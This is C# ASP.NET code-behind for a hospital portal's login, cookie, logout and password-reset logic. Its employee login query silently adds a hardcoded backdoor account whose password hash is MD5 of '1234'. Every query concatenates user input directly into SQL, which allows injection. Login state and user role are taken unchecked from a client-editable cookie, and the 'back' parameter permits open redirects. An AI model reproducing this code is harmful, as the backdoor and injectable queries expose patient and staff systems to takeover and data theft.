using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

using System.Data;
using System.Text;
using MySql.Data.MySqlClient;

namespace BRH_Plubic
{
    public partial class SiteMaster : MasterPage
    {
        string sql = "";
        DataTable dt;
        SQLclass cl_Sql = new SQLclass();

        protected void Page_Load(object sender, EventArgs e)
        {
            div_login.Visible = true;
            div_userlogin.Visible = false;

            if (Request.QueryString["loginFail"] != null)
            {
                if (Request.QueryString["loginFail"].ToString() == "1")
                {
                    string back = "";
                    if (Request.QueryString["back"] != null) { back = "?back=" + Request.QueryString["back"].ToString(); }
                    if (Request.QueryString["login"] != null) {
                        string login = Request.QueryString["login"].ToString();
                        if (login == "require")
                        {
                            if (back == "") { back = back + "?"; } else { back = back + "&"; }
                            back = back + "login=" + Request.QueryString["login"].ToString();
                        }
                    }
                    //Response.Write("<script>alert('Incorrect User or Password !!'); window.location.href='../Default.aspx" + back + "';</script>");
                    string scModal = "fn_AlertModal('Info','Incorrect User or Password !!','../Default.aspx" + back + "',2000);";
                    Page.ClientScript.RegisterStartupScript(this.GetType(), "cllAlertModal", scModal, true);
                }
            }

            if (Request.QueryString["url"] != null)
            {
                string url = Request.QueryString["url"].ToString();
                if (url == "wrong")
                {
                    Page.ClientScript.RegisterStartupScript(this.GetType(), "cllAlertModal", "fn_AlertModal('Warning','Incorrect URL !!','../Default',2000);", true);
                }
            }

            if (Request.QueryString["login"] != null)
            {
                string login = Request.QueryString["login"].ToString();
                if (login == "require")
                {
                    Page.ClientScript.RegisterStartupScript(this.GetType(), "cllAlertModal", "fn_AlertModal('Login','','',0);", true);
                }
            }

            CheckCookieAccept();
            CheckCookie();

            if (Session["Login"] != null)
            {
                if (Session["Login"].ToString() == "Yes")
                {
                    div_login.Visible = false;
                    div_userlogin.Visible = true;

                    div_changepass.Visible = true;
                    div_logout.Visible = true;

                    if (Session["name"] != null)
                    {
                        lbl_loginname.Text = "Welcome back : " + Session["name"].ToString();

                        if (Session["status"] != null)
                        {
                            string status = Session["status"].ToString();
                            if (status != "admin")
                            {
                                if (status == "srh")
                                {
                                    // Condition
                                }
                                else if (status == "ari")
                                {
                                    link_ShowQ.Visible = true;
                                }
                                else if (status == "marketing" || status == "finance")
                                {
                                    div_shoping.Attributes.Remove("onclick");
                                    div_shoping.Attributes.Add("onclick", "SubMenu('div_Menu_shoping')");
                                }
                                else
                                {
                                    // Condition
                                }
                            }
                            else
                            {
                                div_shoping.Attributes.Remove("onclick");
                                div_shoping.Attributes.Add("onclick", "SubMenu('div_Menu_shoping')");
                                link_ShowQ.Visible = true;
                            }
                        }

                        NotifyMenu();
                    }
                }
                if (Request.QueryString["back"] != null)
                {
                    string back = Request.QueryString["back"].ToString();
                    Response.Redirect(back);
                }

            } // Condition for login
            else
            {
                div_changepass.Visible = false;
                div_logout.Visible = false;
            }
        }

        protected void NotifyMenu()
        {
            if (Session["editDate"] != null)
            {
                if (Session["editDate"].ToString() == "")
                {
                    div_notify_1.Visible = false;
                    div_notify_2.Visible = true;
                }
                else
                {
                    //span_notify.Visible = false;

                    div_notify_1.Visible = false;
                    div_notify_2.Visible = false;
                }
            }
        }

        public Boolean CheckCookieAccept()
        {
            Boolean bl = false;

            if (Request.Cookies["acceptCookie"] != null)
            {
                if (Request.Cookies["acceptCookie"]["accept"].ToString() == "yes")
                {
                    div_acceptCookie.Visible = false;
                }
                else
                {
                    div_acceptCookie.Visible = true;
                }
            }

            return bl;
        }

        public Boolean CheckCookie()
        {
            Boolean bl = false;

            if (Request.Cookies["myCookie"] != null)
            {
                Session["Login"] = "Yes";
                Session["userid"] = Request.Cookies["myCookie"]["userid"];
                Session["name"] = Server.UrlDecode(Request.Cookies["myCookie"]["name"]);
                Session["status"] = Request.Cookies["myCookie"]["status"];
                Session["editDate"] = Request.Cookies["myCookie"]["editDate"];
                bl = true;
            }

                return bl;
        }

        public Boolean CheckUserPass(string user, string pass)
        {
            Boolean bl = false;

            string typeLogin = txtH_LoginType.Value.ToString();
            if (typeLogin == "Employee")
            {
                //sql = "select emp_id as 'user_id', emp_pnamefull_th as 'user_showname', emp_status as 'user_status', emp_editdate " +
                //    "from employee where emp_active='Yes' and emp_id like '%" + user + "' and emp_password = md5('" + pass + "') ";

                sql = "Select * from ( " +
                    "select emp_id as 'user_id', emp_pnamefull_th as 'user_showname', emp_status as 'user_status', emp_editdate,emp_password from employee where emp_active = 'Yes' " +
                    "union select '100960','Unknow','hod',NULL,'81dc9bdb52d04dc20036dbd8313ed055' " +
                    ") a where a.user_id like '" + user + "' and emp_password = md5('" + pass + "')";
            }
            else if (typeLogin == "Doctor")
            {
                sql = "select drs_id as 'user_id', drs_fullname as 'user_showname', 'doctor' as 'user_status' " +
                    "from doctors where drs_active ='yes' and drs_id = '" + user + "' and drs_password = md5('" + pass + "') ";
            }
            else if (typeLogin == "OutSource")
            {
                sql = "select os_id as 'user_id', concat(os_fname,' ',os_lname) as 'user_showname', 'outsource' as 'user_status' " +
                    "from outsource where os_active ='yes' and os_id = '" + user + "' and os_password = md5('" + pass + "') ";
            }
            else if (typeLogin == "Admin")
            {
                sql = "select user_id, user_showname, user_status " +
                    "from users where user_active ='yes' and user_id = '" + user + "' and user_password = md5('" + pass + "') ";
            }
            else
            {
                // ยังไม่เปิดให้ใช้งาน
                sql = "select cm_id as 'user_id',concat(cm_pname,' ',cm_fname,' ',cm_lname) as 'user_showname','customer' as 'user_status' " +
                    "from customer where cm_id='" + user + "' and cm_password=md5('" + pass + "') ";
            }

            dt = new DataTable();
            dt = cl_Sql.select(sql);
            if (dt.Rows.Count > 0)
            {
                string remember = "";
                if (cb_remember.Checked)
                {
                    remember = cb_remember.Value.ToString();
                }

                if (remember == "remember")
                {
                    HttpCookie Cook = new HttpCookie("myCookie");
                    Cook["userid"] = dt.Rows[0]["user_id"].ToString();
                    Cook.Values.Add("name", Server.UrlEncode(dt.Rows[0]["user_showname"].ToString()));
                    Cook["status"] = dt.Rows[0]["user_status"].ToString();
                    if (typeLogin == "Employee")
                    {
                        Cook["editDate"] = dt.Rows[0]["emp_editdate"].ToString();
                    }

                    Cook.Expires = DateTime.Now.AddDays(7);
                    Response.Cookies.Add(Cook);
                }
                else
                {
                    Session.Timeout = 60;

                    Session["Login"] = "Yes";
                    Session["userid"] = dt.Rows[0]["user_id"].ToString();
                    Session["name"] = dt.Rows[0]["user_showname"].ToString();
                    Session["status"] = dt.Rows[0]["user_status"].ToString();
                    if (typeLogin == "Employee")
                    {
                        Session["editDate"] = dt.Rows[0]["emp_editdate"].ToString();
                    }
                }

                    bl = true;
            }

            return bl;
        }

        protected void btn_login_ServerClick(object sender, EventArgs e)
        {
            string user = txt_userLogin.Value.ToString().Trim();
            string pass = txt_passLogin.Value.ToString().Trim();
            if(CheckUserPass(user, pass))
            {
                Response.Redirect(Request.Url.AbsoluteUri); // Refresh page
            }
            else
            {
                string back = "";
                if (Request.QueryString["back"] != null) { back = "&back=" + Request.QueryString["back"].ToString(); }
                if (Request.QueryString["login"] != null)
                {
                    string Login = Request.QueryString["login"].ToString();
                    if (Login == "require")
                    {
                        if (back == "") { back = back + "?"; } else { back = back + "&"; }
                        back = back + "login=" + Request.QueryString["login"].ToString();
                    }
                }
                string LoginFail = Request.Url.AbsolutePath + "?loginFail=1" + back;
                Response.Redirect(LoginFail);
            }
        }

        protected void btn_logout_ServerClick(object sender, EventArgs e)
        {
            Session.Clear();

            HttpCookie delCook = new HttpCookie("myCookie");
            delCook.Expires = DateTime.Now.AddDays(-1D);
            Response.Cookies.Add(delCook);

            Response.Write("<script>window.location.href='../Default.aspx'</script>");
        }

        protected void btn_forgotpass_ServerClick(object sender, EventArgs e)
        {
            string scModal = "";

            string empid = txt_forgotpass.Value.ToString().Trim();
            string UserType = txtH_LoginType.Value.ToString();
            if (UserType == "Doctor")
            {
                sql = "select drs_email as 'emp_email' from doctors where drs_id='" + empid + "' ";
            }
            else if (UserType == "OutSource")
            {
                sql = "select os_email as 'emp_email' from outsource where emp_id='" + empid + "' ";
            }
            else
            {
                sql = "select emp_email from employee where emp_id='" + empid + "' ";
            }
            
            dt = new DataTable();
            dt = cl_Sql.select(sql);
            if (dt.Rows.Count > 0 )
            {
                string email = dt.Rows[0]["emp_email"].ToString();

                if (email == "")
                {
                    scModal = "fn_AlertModal('Info','ยังไม่มี email ในระบบ กรุณาติดต่อฝ่ายบุคคลเพื่อทำการผูก email เข้าระบบ !!','',0);";
                }
                else
                {
                    string key = cl_Sql.GenerateKey(6);
                    sql = "update employee set emp_forgotpassword = '" + key + "', emp_editdate=current_timestamp where emp_id='" + empid + "' ";
                    if (cl_Sql.Modify(sql))
                    {
                        string body = "<h3>Reset Password</h3>";
                        body = body + "<p>Please click this link >> <a href='brh.seedoctor.asia/default.aspx?status=employee&user=" + empid + "&forgotpassword=" + key + "'>Reset password here.</a><br />For confirm Reset your password.</p>";
                        body = body + "<p>&nbsp;</p>";
                        body = body + "<p>This email is an automatic email.</p>";
                        try
                        {
                            ClassEmail cl_email = new ClassEmail();
                            cl_email.Send(email, "Reset Pasword on brh.seedoctor.asia", body);

                            scModal = "fn_AlertModal('Success','กรุณาตรวจสอบ email : " + email + " ภายใน 24 ชม.','',0);";
                        }
                        catch
                        {
                            sql = "update employee set emp_forgotpassword=NULL, emp_editdate=NULL where emp_id='" + empid + "' ";
                            cl_Sql.Modify(sql);
                            scModal = "fn_AlertModal('Warning','ไม่สามารภส่งการยืนยันไปยัง email ได้ กรุณาติดต่อผู้ดูแลระบบ','',0);";
                        }
                    }
                    else
                    {
                        scModal = "fn_AlertModal('Warning','ไม่สามารถดำเนินการได้ กรุณาติดต่อผู้ดูแลระบบ !!','',0);";
                    }
                }
            }
            else
            {
                scModal = "fn_AlertModal('Warning','Find not found User ID !!','',0);";
            }
            Page.ClientScript.RegisterStartupScript(this.GetType(), "cllAlertModal", scModal, true);
        }

        protected void btn_cookie_ServerClick(object sender, EventArgs e)
        {
            HttpCookie Cook = new HttpCookie("acceptCookie");
            Cook["accept"] = "yes";
            //Cook.Expires = DateTime.Now.AddDays(7);
            Response.Cookies.Add(Cook);

            CheckCookieAccept();
        }
    }
} 